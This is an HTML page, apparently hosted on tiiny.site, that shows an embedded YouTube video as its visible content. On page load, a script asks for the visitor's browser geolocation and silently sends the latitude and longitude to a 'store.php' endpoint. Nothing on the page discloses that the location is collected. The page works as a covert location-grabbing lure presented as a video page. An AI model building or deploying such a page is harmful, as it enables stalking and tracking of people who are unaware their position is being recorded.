<!DOCTYPE html>
<html>

<head>
  <script defer="" data-domain="jade-olia-29.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script><script defer="" data-domain="jade-olia-29.tiiny.site" src="https://analytics.tiiny.site/js/plausible.js"></script><script type="text/javascript" src="https://tiiny.host/ad-script.js"></script>
</head>

<body onload="getLocation()">
<iframe width="1155" height="500" src="https://www.youtube.com/embed/PFJAuAWxuvI">
</iframe>
<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function success(position) {
  const xhttp = new XMLHttpRequest();
  xhttp.open("GET", "store.php?lat="+position.coords.latitude + "&long=" +position.coords.longitude ); 
  xhttp.send();
}

function error() {
  alert("Sorry, no position available.");
}
</script>



</body></html>
